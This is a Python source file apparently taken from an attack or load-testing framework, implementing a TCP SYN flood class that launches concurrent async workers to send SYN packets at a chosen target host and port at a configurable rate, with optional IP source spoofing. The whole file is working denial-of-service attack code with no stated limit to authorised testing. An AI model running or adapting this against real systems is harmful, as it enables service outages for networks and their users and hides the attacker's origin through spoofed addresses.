import asyncio
import random
from typing import Any

import structlog

from attack.base import BaseAttacker
from utils.packet import PacketCrafter

logger = structlog.get_logger(__name__)


class SYNFloodAttack(BaseAttacker):
    name = "syn_flood"
    description = "TCP SYN flood attack using raw sockets with optional IP spoofing"

    async def run(
        self,
        target: str,
        port: int = 443,
        rate: int = 1000,
        threads: int = 10,
        spoof: bool = False,
        **kwargs: Any,
    ) -> None:
        if not PacketCrafter.PACKET_AVAILABLE:
            logger.error("scapy_required", message="SYN flood requires scapy. Install with: pip install scapy")
            self.session.fail("scapy not available")
            return

        per_thread_rate = max(1, rate // threads)
        interval = 1.0 / per_thread_rate if per_thread_rate > 0 else 0.001

        async def worker() -> None:
            while not self.session.is_stopped:
                await self.session._pause_event.wait()
                sent = PacketCrafter.send_syn_flood(target, port, count=1, spoof=spoof)
                if sent:
                    self.session.stats.packets_sent += 1
                    self.session.stats.bytes_sent += 40
                else:
                    self.session.stats.errors += 1
                await asyncio.sleep(interval)

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        try:
            await self.session.wait_for_stop()
        finally:
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
